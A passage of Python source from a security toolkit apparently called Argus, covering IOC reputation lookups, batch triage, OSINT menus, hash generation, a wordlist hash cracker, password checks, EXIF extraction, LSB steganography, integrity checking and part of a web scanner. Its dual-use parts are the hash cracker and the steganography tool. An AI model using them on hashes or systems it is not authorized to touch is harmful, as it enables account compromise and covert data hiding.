        # ── VirusTotal URL / Domain ───────────────────────────────────
        if virustotal_key:
            print("\n  [*] Querying VirusTotal ...")
            try:
                vt_data = _ioc_query_virustotal(ioc, kind, virustotal_key)
                if "error" in vt_data:
                    if vt_data["error"] == "not_found":
                        print("  [  i  ] Not yet analysed in VirusTotal.")
                        lines.append("VirusTotal: not found (may not have been scanned yet)")
                    else:
                        err = _scrub_key(vt_data["error"], virustotal_key)
                        print(f"  [!] {err}")
                        lines.append(f"VirusTotal error: {err}")
                else:
                    _render_vt_result(vt_data, kind, lines)
            except Exception as e:
                print(f"  [!] VirusTotal query failed: {_scrub_key(e, virustotal_key)}")
                lines.append(f"VirusTotal error: {_scrub_key(e, virustotal_key)}")

    elif kind.startswith("hash"):
        print("\n  [*] Querying MalwareBazaar ...")
        try:
            data = _ioc_query_malwarebazaar(ioc)
            status = data.get("query_status", "")
            if status == "hash_not_found":
                print("  [  OK  ] Not found in MalwareBazaar — hash not known malicious")
                lines.append("MalwareBazaar: not found (clean)")
            elif status == "ok":
                results = data.get("data", [{}])
                if results:
                    r = results[0]
                    file_name  = r.get("file_name", "?")
                    file_type  = r.get("file_type", "?")
                    mime       = r.get("mime_type", "?")
                    signature  = r.get("signature") or "unknown"
                    tags       = r.get("tags") or []
                    first_seen = r.get("first_seen", "?")
                    reporter   = r.get("reporter", "?")

                    print(f"  [ !! ] Found in MalwareBazaar")
                    print(f"  File name      : {file_name}")
                    print(f"  File type      : {file_type} ({mime})")
                    print(f"  Signature      : {signature}")
                    print(f"  Tags           : {', '.join(tags) if tags else 'none'}")
                    print(f"  First seen     : {first_seen}")
                    print(f"  Reported by    : {reporter}")

                    lines += [
                        "MalwareBazaar Results:",
                        f"  File name  : {file_name}",
                        f"  File type  : {file_type}",
                        f"  Signature  : {signature}",
                        f"  Tags       : {', '.join(tags) if tags else 'none'}",
                        f"  First seen : {first_seen}",
                    ]
            else:
                print(f"  [!] Unexpected response: {status}")
                lines.append(f"MalwareBazaar status: {status}")
        except Exception as e:
            print(f"  [!] MalwareBazaar query failed: {e}")
            lines.append(f"MalwareBazaar error: {e}")

        # ── VirusTotal Hash ───────────────────────────────────────────
        if virustotal_key:
            print("\n  [*] Querying VirusTotal ...")
            try:
                vt_data = _ioc_query_virustotal(ioc, kind, virustotal_key)
                if "error" in vt_data:
                    if vt_data["error"] == "not_found":
                        print("  [  OK  ] Hash not found in VirusTotal.")
                        lines.append("VirusTotal: not found (hash not in VT database)")
                    else:
                        err = _scrub_key(vt_data["error"], virustotal_key)
                        print(f"  [!] {err}")
                        lines.append(f"VirusTotal error: {err}")
                else:
                    _render_vt_result(vt_data, kind, lines)
            except Exception as e:
                print(f"  [!] VirusTotal query failed: {_scrub_key(e, virustotal_key)}")
                lines.append(f"VirusTotal error: {_scrub_key(e, virustotal_key)}")

    else:
        print(f"  [i] No live API available for type '{kind}'.")
        lines.append(f"No live API for type: {kind}")

    # ── Reference links always shown ─────────────────────────────────
    print()
    print("  Reference links:")
    vt_id = base64.urlsafe_b64encode(ioc.encode()).decode().rstrip("=")
    if kind == "ip":
        ref_links = [
            ("VirusTotal",    f"https://www.virustotal.com/gui/ip-address/{quoted}"),
            ("AlienVault OTX",f"https://otx.alienvault.com/indicator/IPv4/{quoted}"),
        ]
    elif kind == "domain":
        ref_links = [
            ("VirusTotal",    f"https://www.virustotal.com/gui/domain/{quoted}"),
            ("AlienVault OTX",f"https://otx.alienvault.com/indicator/domain/{quoted}"),
        ]
    elif kind == "url":
        ref_links = [
            ("VirusTotal",    f"https://www.virustotal.com/gui/url/{vt_id}"),
            ("AlienVault OTX",f"https://otx.alienvault.com/indicator/url/{quoted}"),
        ]
    elif kind.startswith("hash"):
        ref_links = [
            ("VirusTotal",    f"https://www.virustotal.com/gui/file/{quoted}"),
            ("AlienVault OTX",f"https://otx.alienvault.com/indicator/file/{quoted}"),
        ]
    else:
        ref_links = [
            ("VirusTotal",    f"https://www.virustotal.com/gui/search/{quoted}"),
            ("AlienVault OTX",f"https://otx.alienvault.com/browse/global/pulses?q={quoted}"),
        ]
    for label, url in ref_links:
        print(f"    {label}: {url}")
        lines.append(f"{label}: {url}")

    print()
    _save_osint_run("ioc", ioc, f"type {kind}", lines)
    input("Press Enter to return...")


def run_batch_ioc_processor() -> None:
    """
    OSINT submenu option 9: Batch IOC Processor.
    Reads a .txt file of IOCs (one per line), classifies each, runs
    VirusTotal / AbuseIPDB / URLhaus / MalwareBazaar lookups, and
    produces a combined triage report with optional CSV export.
    """
    import time

    print_rule("Batch IOC Processor")
    print("  Process a .txt file of IOCs — one per line, # lines are ignored.")
    print("  Runs VirusTotal, AbuseIPDB, URLhaus, and MalwareBazaar lookups.\n")

    file_path = input("  IOC file path: ").strip().strip('"')
    if not os.path.isfile(file_path):
        print(f"  [!] File not found: {file_path}")
        input("\nPress Enter to return...")
        return

    with open(file_path, "r", encoding="utf-8", errors="ignore") as fh:
        raw_iocs = [ln.strip() for ln in fh if ln.strip() and not ln.startswith("#")]

    if not raw_iocs:
        print("  [!] File is empty or contains only comments.")
        input("\nPress Enter to return...")
        return

    print(f"  [+] {len(raw_iocs)} IOC(s) loaded.\n")

    config         = _load_argus_config()
    abuseipdb_key  = config.get("abuseipdb_key",  "")
    virustotal_key = config.get("virustotal_key", "")
    urlhaus_key    = config.get("urlhaus_key",    "")

    active = [s for s, k in [
        ("AbuseIPDB",    abuseipdb_key),
        ("VirusTotal",   virustotal_key),
        ("URLhaus",      urlhaus_key),
        ("MalwareBazaar", "yes"),
        ("InternetDB",    "yes"),
    ] if k]
    print(f"  [*] Active sources: {', '.join(active)}\n")

    def _lookup_one(ioc: str, kind: str) -> tuple[str, int, int, list[str]]:
        """Run all relevant lookups for a single IOC. Returns (verdict, m, s, detail_lines)."""
        malicious  = 0
        suspicious = 0
        verdict    = "UNKNOWN"
        detail     = []

        if kind == "ip":
            if abuseipdb_key:
                try:
                    d = _ioc_query_abuseipdb(ioc, abuseipdb_key)
                    if "error" not in d:
                        score = d.get("abuseConfidenceScore", 0)
                        detail.append(f"AbuseIPDB score={score}")
                        if score >= 75:
                            malicious  = max(malicious, score)
                            verdict    = "MALICIOUS"
                        elif score >= 25:
                            suspicious = max(suspicious, score)
                            verdict    = verdict if verdict == "MALICIOUS" else "SUSPICIOUS"
                except Exception:
                    pass
            if virustotal_key:
                try:
                    vt = _ioc_query_virustotal(ioc, "ip", virustotal_key)
                    if "error" not in vt:
                        st = vt.get("attributes", {}).get("last_analysis_stats", {})
                        m, s, t = st.get("malicious", 0), st.get("suspicious", 0), sum(st.values())
                        detail.append(f"VT {m}/{t} malicious")
                        malicious  = max(malicious,  m)
                        suspicious = max(suspicious, s)
                        if m >= 5:
                            verdict = "MALICIOUS"
                        elif m > 0 or s >= 3:
                            verdict = verdict if verdict == "MALICIOUS" else "SUSPICIOUS"
                except Exception:
                    pass

        elif kind in ("domain", "url"):
            try:
                d = _ioc_query_urlhaus(ioc, kind, urlhaus_key)
                if "error" not in d and d.get("query_status") not in ("no_results", None):
                    malicious = 1
                    verdict   = "MALICIOUS"
                    detail.append(f"URLhaus: {d.get('query_status','found')}")
            except Exception:
                pass
            if virustotal_key:
                try:
                    vt = _ioc_query_virustotal(ioc, kind, virustotal_key)
                    if "error" not in vt:
                        st = vt.get("attributes", {}).get("last_analysis_stats", {})
                        m, s, t = st.get("malicious", 0), st.get("suspicious", 0), sum(st.values())
                        detail.append(f"VT {m}/{t} malicious")
                        if m >= 5:
                            verdict = "MALICIOUS"
                        elif m > 0 or s >= 3:
                            verdict = verdict if verdict == "MALICIOUS" else "SUSPICIOUS"
                except Exception:
                    pass

        elif kind.startswith("hash"):
            try:
                d = _ioc_query_malwarebazaar(ioc)
                if d.get("query_status") == "ok":
                    malicious = 1
                    verdict   = "MALICIOUS"
                    r0        = (d.get("data") or [{}])[0]
                    detail.append(f"MBazaar: {r0.get('signature','?')} [{r0.get('file_type','?')}]")
            except Exception:
                pass
            if virustotal_key:
                try:
                    vt = _ioc_query_virustotal(ioc, kind, virustotal_key)
                    if "error" not in vt:
                        st = vt.get("attributes", {}).get("last_analysis_stats", {})
                        m, s, t = st.get("malicious", 0), st.get("suspicious", 0), sum(st.values())
                        detail.append(f"VT {m}/{t} malicious")
                        if m >= 5:
                            verdict = "MALICIOUS"
                        elif m > 0 or s >= 3:
                            verdict = verdict if verdict == "MALICIOUS" else "SUSPICIOUS"
                except Exception:
                    pass

        if verdict == "UNKNOWN" and malicious == 0:
            verdict = "CLEAN"
        return verdict, malicious, suspicious, detail

    results      = []
    report_lines = [
        "Batch IOC Triage Report",
        f"Source file : {file_path}",
        f"IOCs loaded : {len(raw_iocs)}",
        f"Sources     : {', '.join(active)}",
        "",
    ]

    print(f"  [*] Processing {len(raw_iocs)} IOC(s)...\n")

    if RICH_AVAILABLE:
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TimeRemainingColumn(),
            console=console,
            transient=True,
        ) as prog:
            task = prog.add_task("Processing IOCs", total=len(raw_iocs))
            for ioc in raw_iocs:
                kind                    = _classify_ioc(ioc)
                verdict, m, s, detail   = _lookup_one(ioc, kind)
                results.append({"ioc": ioc, "kind": kind, "verdict": verdict,
                                 "malicious": m, "suspicious": s, "detail": detail})
                colour = "red" if verdict == "MALICIOUS" else "yellow" if verdict == "SUSPICIOUS" else "green"
                prog.console.print(
                    f"  [{colour}]{verdict:<10}[/{colour}]  {ioc[:55]}  [dim]({kind})[/dim]"
                )
                prog.advance(task)
                time.sleep(0.25)
    else:
        for idx, ioc in enumerate(raw_iocs, 1):
            print(f"\r  [~] {idx}/{len(raw_iocs)} — {ioc[:45]:<45}", end="", flush=True)
            kind                  = _classify_ioc(ioc)
            verdict, m, s, detail = _lookup_one(ioc, kind)
            results.append({"ioc": ioc, "kind": kind, "verdict": verdict,
                             "malicious": m, "suspicious": s, "detail": detail})
            time.sleep(0.25)
        print()

    # ── Summary ───────────────────────────────────────────────────────
    mal_n  = sum(1 for r in results if r["verdict"] == "MALICIOUS")
    sus_n  = sum(1 for r in results if r["verdict"] == "SUSPICIOUS")
    cln_n  = len(results) - mal_n - sus_n

    print(f"\n\n  {'─'*62}")
    print(f"  TRIAGE SUMMARY")
    print(f"  {'─'*62}")
    print(f"  Total processed   : {len(results)}")
    print(f"  MALICIOUS         : {mal_n}")
    print(f"  SUSPICIOUS        : {sus_n}")
    print(f"  CLEAN / UNKNOWN   : {cln_n}")
    print(f"  {'─'*62}")

    flagged = [r for r in results if r["verdict"] in ("MALICIOUS", "SUSPICIOUS")]
    if flagged:
        print(f"\n  Flagged IOCs:")
        for r in flagged:
            detail_str = "  |  ".join(r["detail"])[:65]
            print(f"    [{r['verdict']:<10}] {r['ioc'][:52]}  ({r['kind']})")
            if detail_str:
                print(f"                 {detail_str}")

    report_lines += [
        f"SUMMARY: Total={len(results)}  Malicious={mal_n}  Suspicious={sus_n}  Clean={cln_n}",
        "",
        "DETAILED RESULTS",
    ]
    for r in results:
        report_lines.append(f"  [{r['verdict']:<10}] [{r['kind']:<12}] {r['ioc']}")
        for d in r["detail"]:
            report_lines.append(f"                              {d}")

    # ── Optional CSV export ───────────────────────────────────────────
    ans = input("\n  Export results to CSV? (y/n) [n]: ").strip().lower()
    if ans == "y":
        import csv as _csv
        ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        csv_path = f"batch_ioc_{ts}.csv"
        try:
            with open(csv_path, "w", newline="", encoding="utf-8") as fh:
                writer = _csv.DictWriter(
                    fh,
                    fieldnames=["ioc", "kind", "verdict", "malicious", "suspicious", "detail"],
                )
                writer.writeheader()
                for r in results:
                    row = dict(r)
                    row["detail"] = " | ".join(row["detail"])
                    writer.writerow(row)
            print(f"  [+] CSV saved: {csv_path}")
        except Exception as e:
            print(f"  [!] CSV export failed: {e}")

    _save_osint_run(
        "batch_ioc", file_path,
        f"Batch IOC: {len(results)} IOCs — {mal_n} malicious, {sus_n} suspicious",
        "\n".join(report_lines),
    )
    input("\nPress Enter to return...")


def run_osint_tools() -> None:
    """
    Sub-menu hub for all OSINT tools.

    Routes to: domain lookup, IP intelligence, email analyzer, email
    header analyzer, username checker, image geolocation, IOC assistant,
    and batch IOC processor.
    """
    while True:
        print_rule("OSINT Toolkit")
        print("  Passive tools for authorized research and asset inventory.\n")
        print("  1. Domain DNS / WHOIS / certificate transparency")
        print("  2. IP intelligence")
        print("  3. Email analyzer")
        print("  4. Email header analyzer")
        print("  5. Username checker")
        print("  6. Image geolocation assistant")
        print("  7. IOC lookup assistant")
        print("  8. File metadata extractor")
        print("  9. Batch IOC processor")
        print("  q. Back")
        print("\n  [i] For full SSL/TLS inspection use tool 15 from the main menu.")
        choice = input("\n  Choice: ").strip().lower()
        if choice == "1":
            run_osint_domain_lookup()
        elif choice == "2":
            run_osint_ip_intelligence()
        elif choice == "3":
            run_osint_email_analyzer()
        elif choice == "4":
            run_osint_email_header_analyzer()
        elif choice == "5":
            run_osint_username_checker()
        elif choice == "6":
            run_osint_image_geolocation()
        elif choice == "7":
            run_osint_ioc_assistant()
        elif choice == "8":
            run_metadata_extractor()
        elif choice == "9":
            run_batch_ioc_processor()
        elif choice == "q":
            return
        else:
            print("  [!] Invalid choice.")


HASH_ALGORITHMS = ["md5", "sha1", "sha256", "sha512"]


def _hash_text_value(text: str, algorithm: str) -> str:
    h = hashlib.new(algorithm)
    h.update(text.encode("utf-8"))
    return h.hexdigest()


def run_hash_generator_tool() -> None:
    """
    Hash text or a file using a selectable algorithm.

    Supported algorithms include MD5, SHA-1, SHA-256, SHA-512, SHA3-256,
    and BLAKE2b.  Accepts typed text or a file path; for files, reads in
    1 MB chunks to handle large inputs without loading them into memory.
    """
    print_rule("Hash Generator")
    for i, name in enumerate(HASH_ALGORITHMS, 1):
        print(f"  {i}. {name}")
    raw = input("\n  Algorithm [sha256]: ").strip().lower() or "sha256"
    algorithm = HASH_ALGORITHMS[int(raw) - 1] if raw.isdigit() and 1 <= int(raw) <= len(HASH_ALGORITHMS) else raw
    if algorithm not in HASH_ALGORITHMS:
        print("  [!] Unsupported algorithm.")
        input("\nPress Enter to return...")
        return
    text = input("  Input text: ")
    print(f"\n  {algorithm}: {_hash_text_value(text, algorithm)}")
    if algorithm in ("md5", "sha1"):
        print("  [!] MD5/SHA-1 are legacy. Use SHA-256+ for security-sensitive integrity.")
    input("\nPress Enter to return...")


def _guess_hash_algorithms(hash_value: str) -> list[str]:
    length_map = {32: ["md5"], 40: ["sha1"], 64: ["sha256"], 128: ["sha512"]}
    return length_map.get(len(hash_value), HASH_ALGORITHMS)


def run_hash_cracker() -> None:
    """
    Dictionary-based hash cracker with automatic algorithm detection.

    Accepts a hash value and infers likely algorithms from its length and
    character set.  Iterates a user-supplied wordlist concurrently across
    the candidate algorithms, printing the plaintext on the first match.
    For use only on hashes you own or are authorized to test.
    """
    print_rule("Hash Cracker")
    print("  Use only for hashes you own or are authorized to test.\n")
    target = input("  Hash: ").strip().lower()
    guesses = _guess_hash_algorithms(target)
    raw_alg = input(f"  Algorithm [{'/'.join(guesses)}]: ").strip().lower()
    algorithms = [raw_alg] if raw_alg else guesses
    algorithms = [alg for alg in algorithms if alg in HASH_ALGORITHMS]
    wordlist = input("  Wordlist path: ").strip().strip('"')
    if not os.path.isfile(wordlist):
        print("  [!] Wordlist not found.")
        input("\nPress Enter to return...")
        return

    # Count lines once upfront for accurate progress tracking
    total_words = None
    try:
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            total_words = sum(1 for _ in f)
        print(f"  [*] {total_words:,} words loaded.")
    except OSError:
        pass

    checked = 0
    found_result = None
    print("  [*] Cracking... (Ctrl-C to cancel)\n")

    def _crack_iter(f: Any) -> tuple[str, str, int] | None:
        """Inner loop: try each word, return (alg, word, count) on match or None."""
        nonlocal checked
        for line in f:
            word = line.rstrip("\r\n")
            checked += 1
            for alg in algorithms:
                if _hash_text_value(word, alg) == target:
                    return alg, word, checked
        return None

    try:
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            if RICH_AVAILABLE and total_words:
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(),
                    MofNCompleteColumn(),
                    TextColumn("[dim]{task.fields[last_word]}"),
                    TimeRemainingColumn(),
                    console=console,
                    transient=True,
                ) as progress:
                    task = progress.add_task("Cracking...", total=total_words, last_word="")
                    for line in f:
                        word = line.rstrip("\r\n")
                        checked += 1
                        progress.update(task, advance=1, last_word=word[:28])
                        for alg in algorithms:
                            if _hash_text_value(word, alg) == target:
                                found_result = (alg, word, checked)
                                break
                        if found_result:
                            break
            else:
                for line in f:
                    word = line.rstrip("\r\n")
                    checked += 1
                    if checked % 10_000 == 0:
                        print(
                            f"\r  [~] {checked:>10,} words checked"
                            f"  |  last: {word[:30]:<30}",
                            end="", flush=True,
                        )
                    for alg in algorithms:
                        if _hash_text_value(word, alg) == target:
                            found_result = (alg, word, checked)
                            break
                    if found_result:
                        break
    except KeyboardInterrupt:
        print(f"\n\n  [*] Cancelled after {checked:,} words.")
        input("\nPress Enter to return...")
        return
    except OSError as e:
        print(f"\n  [!] Could not read wordlist: {e}")
        input("\nPress Enter to return...")
        return

    if found_result:
        alg, word, n = found_result
        print(f"\n\n  [+] Match found after {n:,} words")
        print(f"      Algorithm: {alg}")
        print(f"      Plaintext: {word}")
    else:
        print(f"\n\n  [*] No match after {checked:,} words.")
    input("\nPress Enter to return...")


def run_password_strength_analyzer() -> None:
    """
    Score a password's strength and estimate crack time.

    Reads the password via getpass (not echoed to the terminal), then
    scores it with zxcvbn if available, otherwise falls back to Shannon
    entropy.  Displays score (0-4), estimated offline crack time, and
    any pattern warnings (common words, keyboard walks, dates, etc.).
    """
    print_rule("Password Strength Analyzer")
    password = getpass.getpass("  Password to analyze: ")
    strength = _estimate_password_strength(password)
    print("\n  Strength:")
    print(f"    Engine            : {strength['engine']}")
    print(f"    Score             : {strength['score']} / 4")
    print(f"    Offline fast hash : {strength['offline_fast']}")
    print(f"    Online throttled  : {strength['online_slow']}")
    if strength["suggestions"]:
        print("    Suggestions       : " + "; ".join(strength["suggestions"]))
    input("\nPress Enter to return...")


def run_hibp_password_checker() -> None:
    """
    Check a password against the Have I Been Pwned breach database.

    Uses the HIBP k-anonymity API: only the first 5 characters of the
    SHA-1 hash are sent over the network.  The full hash never leaves
    the machine.  Reports how many times the password appears in known
    breach datasets without disclosing the plaintext to HIBP.
    """
    try:
        import requests
    except ImportError:
        print("\n  [!] requests is not installed. Run: pip install requests")
        input("\nPress Enter to return...")
        return

    print_rule("Have I Been Pwned Password Check")
    print("  Uses the Pwned Passwords k-Anonymity range API.")
    print("  Only the first 5 SHA-1 characters are sent, never the password.\n")
    password = getpass.getpass("  Password to check: ")
    sha1_hash = hashlib.sha1(password.encode("utf-8")).hexdigest().upper()
    prefix, suffix = sha1_hash[:5], sha1_hash[5:]
    url = f"https://api.pwnedpasswords.com/range/{prefix}"
    try:
        resp = requests.get(url, timeout=10, headers={"User-Agent": f"Argus/{APP_VERSION}"})
        resp.raise_for_status()
    except Exception as e:
        print(f"  [!] HIBP lookup failed: {e}")
        input("\nPress Enter to return...")
        return

    count = 0
    for line in resp.text.splitlines():
        remote_suffix, _, remote_count = line.partition(":")
        if remote_suffix.upper() == suffix:
            count = int(remote_count)
            break
    if count:
        print(f"\n  [!] This password appears {count:,} times in Pwned Passwords.")
        print("      Change it anywhere you use it.")
    else:
        print("\n  [+] This password was not found in the Pwned Passwords range response.")
    input("\nPress Enter to return...")


def run_password_hash_tools() -> None:
    """
    Sub-menu hub for password and hash tools.

    Routes to: hash generator, wordlist hash cracker, password strength
    analyzer, and Have I Been Pwned breach checker.
    """
    while True:
        print_rule("Password & Hash Tools")
        print("  1. Hash generator")
        print("  2. Hash cracker (wordlist)")
        print("  3. Password strength analyzer")
        print("  4. Have I Been Pwned password checker")
        print("  q. Back")
        choice = input("\n  Choice: ").strip().lower()
        if choice == "1":
            run_hash_generator_tool()
        elif choice == "2":
            run_hash_cracker()
        elif choice == "3":
            run_password_strength_analyzer()
        elif choice == "4":
            run_hibp_password_checker()
        elif choice == "q":
            return
        else:
            print("  [!] Invalid choice.")


def run_metadata_extractor() -> None:
    """
    Extract filesystem and EXIF metadata from any file.

    Displays OS-level stats (size, created, modified, accessed) for any
    file type.  For images, uses Pillow to extract full EXIF data
    including camera make/model, GPS coordinates, exposure settings, and
    software tags.  Results are saved to the SQLite database.
    Requires: Pillow (for image EXIF).
    """
    print_rule("File Metadata Extractor")
    path = input("  File path: ").strip().strip('"')
    if not os.path.isfile(path):
        print("  [!] File not found.")
        input("\nPress Enter to return...")
        return

    stat = os.stat(path)
    print("\n  Filesystem:")
    print(f"    Size     : {stat.st_size:,} bytes")
    print(f"    Created  : {datetime.datetime.fromtimestamp(stat.st_ctime)}")
    print(f"    Modified : {datetime.datetime.fromtimestamp(stat.st_mtime)}")
    print(f"    Accessed : {datetime.datetime.fromtimestamp(stat.st_atime)}")

    exif_lines = []
    try:
        from PIL import Image, ExifTags
        with Image.open(path) as img:
            print("\n  Image:")
            print(f"    Format   : {img.format}")
            print(f"    Size     : {img.size[0]} x {img.size[1]}")
            exif = img.getexif()
            if exif:
                print("\n  EXIF:")
                for tag_id, value in exif.items():
                    tag = ExifTags.TAGS.get(tag_id, tag_id)
                    line = f"    {tag}: {value}"
                    print(line)
                    exif_lines.append(line)
            else:
                print("\n  EXIF: none found")
    except ImportError:
        print("\n  [!] Pillow is not installed. Run: pip install Pillow")
    except Exception as e:
        print(f"\n  Image metadata unavailable: {e}")

    report = "\n".join([
        f"Metadata: {path}",
        f"Size: {stat.st_size}",
        f"Created: {datetime.datetime.fromtimestamp(stat.st_ctime)}",
        f"Modified: {datetime.datetime.fromtimestamp(stat.st_mtime)}",
        "",
        *exif_lines,
    ])
    _save_tool_run("metadata", path, f"{stat.st_size:,} bytes", report)
    input("\nPress Enter to return...")


def _message_to_bits(message: str) -> Iterator[int]:
    data = message.encode("utf-8") + b"\x00"
    for byte in data:
        for bit in range(7, -1, -1):
            yield (byte >> bit) & 1


def _bits_to_message(bits: list[int]) -> str:
    out = bytearray()
    for i in range(0, len(bits), 8):
        byte_bits = bits[i:i + 8]
        if len(byte_bits) < 8:
            break
        value = 0
        for bit in byte_bits:
            value = (value << 1) | bit
        if value == 0:
            return out.decode("utf-8", errors="replace")
        out.append(value)
    return out.decode("utf-8", errors="replace")


def run_steganography_tool() -> None:
    """
    LSB steganography — hide or extract a text message inside a PNG image.

    Hide mode: encodes a UTF-8 message into the least-significant bits of
    the R, G, and B channels of each pixel sequentially and saves a new PNG.
    The carrier image is unchanged to the eye.  Extract mode: reads those
    LSBs back and decodes the message.  Capacity is roughly
    (width × height × 3) / 8 bytes.
    Requires: Pillow.
    """
    try:
        from PIL import Image
    except ImportError:
        print("\n  [!] Pillow is not installed. Run: pip install Pillow")
        input("\nPress Enter to return...")
        return

    SUPPORTED_EXTS = (".png", ".jpg", ".jpeg", ".bmp")

    print_rule("LSB Steganography")
    print("  Supported formats : PNG, JPEG, BMP")
    print("  Output is always PNG — JPEG compression destroys LSB data.\n")

    while True:
        mode = input("  (h)ide or (r)eveal? ").strip().lower()
        if mode in ("h", "r"):
            break
        print("  [!] Enter 'h' or 'r'.")

    path = input("  Image path (PNG / JPEG / BMP): ").strip().strip('"')
    if not os.path.isfile(path):
        print("  [!] File not found.")
        input("\nPress Enter to return...")
        return
    if not path.lower().endswith(SUPPORTED_EXTS):
        print(f"  [!] Unsupported format. Accepted: {', '.join(SUPPORTED_EXTS)}")
        input("\nPress Enter to return...")
        return

    if path.lower().endswith((".jpg", ".jpeg")):
        print("  [*] JPEG source detected -- reading pixels before compression artifacts.")

    if mode == "h":
        message = input("  Secret message: ")
        out_path = input("  Output PNG [stego.png]: ").strip().strip('"') or "stego.png"
        if not out_path.lower().endswith(".png"):
            out_path += ".png"
        img = Image.open(path).convert("RGBA")
        pixels = list(img.getdata())
        capacity = len(pixels) * 3
        bits = list(_message_to_bits(message))
        if len(bits) > capacity:
            print(f"  [!] Message too large. Capacity is about {capacity // 8 - 1} bytes.")
            input("\nPress Enter to return...")
            return
        bit_iter = iter(bits)
        new_pixels = []
        done = False
        for r, g, b, a in pixels:
            channels = [r, g, b]
            for i in range(3):
                try:
                    bit = next(bit_iter)
                    channels[i] = (channels[i] & 0xFE) | bit
                except StopIteration:
                    done = True
                    break
            new_pixels.append((channels[0], channels[1], channels[2], a))
            if done:
                new_pixels.extend(pixels[len(new_pixels):])
                break
        img.putdata(new_pixels)
        img.save(out_path, "PNG")
        print(f"  [+] Hidden message written to {out_path}")
        print(f"  [*] Capacity used: {len(bits)} / {capacity} bits  ({len(bits)//8} of {capacity//8} bytes)")
    else:
        img = Image.open(path).convert("RGBA")
        bits = []
        for r, g, b, _a in img.getdata():
            bits.extend([r & 1, g & 1, b & 1])
            if len(bits) >= 8 and len(bits) % 8 == 0 and all(bit == 0 for bit in bits[-8:]):
                break
        print("\n  Revealed message:")
        print("  " + _bits_to_message(bits))
    input("\nPress Enter to return...")


def _hash_file(path: str, algorithm: str = "sha256") -> str:
    h = hashlib.new(algorithm)
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


def _build_integrity_manifest(root: str) -> dict[str, str]:
    manifest = {}
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames if d not in {".git", "__pycache__"}]
        for filename in filenames:
            path = os.path.join(dirpath, filename)
            rel = os.path.relpath(path, root)
            try:
                manifest[rel] = _hash_file(path)
            except OSError:
                manifest[rel] = "ERROR"
    return manifest


def run_integrity_checker() -> None:
    """
    SHA-256 file integrity baseline and verification tool.

    Baseline mode: recursively walks a directory, hashes every file, and
    saves the manifest as a JSON file.  Verify mode: re-hashes the same
    tree and compares against a saved manifest, reporting new, missing,
    and modified files.  Skips .git and __pycache__ directories.
    """
    print_rule("File Integrity Checker")
    while True:
        mode = input("  (b)aseline or (v)erify? ").strip().lower()
        if mode in ("b", "v"):
            break
        print("  [!] Enter 'b' or 'v'.")
    root = input("  Directory path: ").strip().strip('"')
    if not os.path.isdir(root):
        print("  [!] Directory not found.")
        input("\nPress Enter to return...")
        return
    manifest_path = input("  Manifest path [integrity_manifest.json]: ").strip().strip('"') or "integrity_manifest.json"

    if mode == "b":
        manifest = _build_integrity_manifest(root)
        payload = {
            "root": os.path.abspath(root),
            "created": datetime.datetime.now().isoformat(timespec="seconds"),
            "algorithm": "sha256",
            "files": manifest,
        }
        with open(manifest_path, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2, sort_keys=True)
        print(f"  [+] Baseline saved: {manifest_path} ({len(manifest)} files)")
    else:
        try:
            with open(manifest_path, "r", encoding="utf-8") as f:
                old = json.load(f)
        except Exception as e:
            print(f"  [!] Could not read manifest: {e}")
            input("\nPress Enter to return...")
            return
        old_files = old.get("files", {})
        new_files = _build_integrity_manifest(root)
        added = sorted(set(new_files) - set(old_files))
        removed = sorted(set(old_files) - set(new_files))
        changed = sorted(path for path in set(old_files) & set(new_files) if old_files[path] != new_files[path])
        print("\n  Integrity results:")
        print(f"    Added   : {len(added)}")
        print(f"    Removed : {len(removed)}")
        print(f"    Changed : {len(changed)}")
        for label, items in (("Added", added), ("Removed", removed), ("Changed", changed)):
            if items:
                print(f"\n  {label}:")
                for item in items[:50]:
                    print(f"    {item}")
                if len(items) > 50:
                    print(f"    ... and {len(items) - 50} more")
    input("\nPress Enter to return...")


def run_file_forensics_tools() -> None:
    """
    Sub-menu hub for file and forensics tools.

    Routes to: file metadata extractor, PNG LSB steganography tool,
    and SHA-256 file integrity checker.
    """
    while True:
        print_rule("File & Forensics")
        print("  1. File metadata extractor")
        print("  2. PNG steganography")
        print("  3. File integrity checker")
        print("  q. Back")
        choice = input("\n  Choice: ").strip().lower()
        if choice == "1":
            run_metadata_extractor()
        elif choice == "2":
            run_steganography_tool()
        elif choice == "3":
            run_integrity_checker()
        elif choice == "q":
            return
        else:
            print("  [!] Invalid choice.")


STANDARD_WEB_CHECKS = {
    "http_redirect", "ssl", "headers", "server", "cors", "methods",
    "cookies", "paths", "robots", "dirlist", "redirect", "ratelimit",
    "waf", "tech", "sslyze", "wellknown", "csrf", "ssrf",
}

CLI_HASH_ALGORITHMS = [
    "sha1", "sha224", "sha256", "sha384", "sha512",
    "sha3_256", "sha3_512", "blake2b",
]


def run_web_scan_once(url: str, enabled_checks: set[str] | list[str] | None = None, save_to_db: bool = True) -> int:
    """Non-interactive scanner path for argparse automation."""
    try:
        import requests
        from requests.exceptions import RequestException
    except ImportError:
        print("\n  [!] requests is not installed.  Run:  pip install requests")
        return 2

    url = _normalize_url(url)
    checks = {key: True for key in (enabled_checks or STANDARD_WEB_CHECKS)}
    session = requests.Session()
    session.headers.update({"User-Agent": _random_user_agent("Scanner")})

    print(f"\n  [*] Connecting to {url} ...")
    try:
        response = session.get(url, timeout=10, allow_redirects=True)
    except RequestException as e:
        print(f"\n  [!] Could not reach target: {e}")
        return 1

    print(f"  [+] Response  : HTTP {response.status_code} ({len(response.content):,} bytes)")
    print(f"  [+] Final URL : {response.url}")

    issues = []
    _check_https(url, issues)
    if checks.get("http_redirect"):
        _check_http_to_https_redirect(url, session, issues)
    if checks.get("ssl"):
        _check_ssl_tls(url, issues)
    if checks.get("sslyze"):
        _run_sslyze_scan(url, issues)
    if checks.get("headers"):
        _check_security_headers(response, issues)
    if checks.get("server"):
        _check_server_disclosure(response, issues)
    if checks.get("cors"):
        _check_cors(response, issues)
    if checks.get("methods"):
        _check_http_methods(url, session, issues)
